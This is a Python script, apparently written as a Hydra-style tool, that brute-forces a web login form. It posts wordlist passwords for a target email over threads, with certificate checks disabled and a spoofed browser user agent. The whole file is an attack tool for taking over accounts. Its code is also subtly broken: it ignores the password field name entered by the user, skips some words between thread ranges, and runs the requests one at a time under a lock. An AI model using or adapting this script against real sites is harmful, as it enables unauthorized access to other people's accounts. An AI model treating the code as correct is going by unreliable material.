import requests
import threading
from sys import exit
from math import floor
import logging

# Disable insecure request warnings
logging.captureWarnings(True)

cow_say = '''
 ___________________
< Hydra driven me crazy! >
 -------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\\
                ||----w |
                ||     ||
'''

print(cow_say)

mode = input("Enter the number of the wanted mode:\n   1 - Word matching mode\n   2 - Status code mode (more efficient but not all servers return 302 as a redirection code): ")
url = input("Enter the target URL: ")
path = input("Enter the word list path: ")

if int(mode) == 1:
    word = input("Enter a word or a sentence that appears when an incorrect password is entered: ")

remail = input("Enter the target email: ")
email = input("Enter the name of the email input: ")

password = input("Enter the name of the password input: ")
sub = input("Enter the name of the thing that is used to submit the POST form (usually a button): ")

threads = int(input("Enter the number of threads (4 is recommanded): "))
print()

passw = []
with open(path, "r") as wordList:
    passw = wordList.read().splitlines()

numofwords = len(passw)

headers = {
    "User-Agent": "Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19A346 Safari/602.1"
}

password_found = False
lock = threading.Lock()  # Create a lock to synchronize access to shared resources

def bruteit(b1, b2):
    parms = {
        email: remail,
        sub: "submit"
    }
    global password_found
    for pas in range(b1, b2):
        # Exit loop if password found by another thread
        with lock:
            # if password_found:
            #    break 
            parms["passing"] = passw[pas]
            res = requests.post(url, data=parms, allow_redirects=True, verify=False, headers=headers)

        if int(mode) == 2:
            if res.status_code == 302:  # HTTP status code for redirect google this(it may be diffrent depending on the http version)
                with lock:
                    password_found = True
                    print(f"Password found: {parms['passing']}")
        elif int(mode) == 1:
            if word not in res.text:
                with lock: #so we do not leave before finshing(100% true passfound)
                        password_found = True
                        print(f"Password found: {parms['passing']}")
                        print("kill the programm it is done!")
                        
                    

threads_list = []
n = floor(numofwords / threads)

for thread in range(1, threads + 1):
    if thread != threads:
        t = threading.Thread(target=bruteit, args=((thread - 1) * n, (n * thread)-1))
        threads_list.append(t)
        t.start()
    else:
        t = threading.Thread(target=bruteit, args=((thread - 1) * n, numofwords - 1))
        threads_list.append(t)
        t.start()

# Wait for all threads to finish

for t in threads_list:
    t.join()
    
if not password_found:
    print("password not found!")
